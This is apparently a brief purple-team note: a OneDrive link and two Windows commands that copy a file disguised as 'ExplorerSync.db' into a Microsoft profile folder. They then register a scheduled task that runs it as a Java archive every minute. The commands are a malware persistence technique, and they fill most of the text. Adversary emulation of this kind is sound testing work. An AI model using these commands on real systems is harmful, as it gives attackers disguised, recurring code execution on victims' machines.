# PurpleTeam

https://onedrive.live.com/view.aspx?resid=5EFC811CDEC9D7F0!6215&ithint=file%2Cdocx&authkey=!ACVO3y1Jyhq0mfY


copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db

schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f
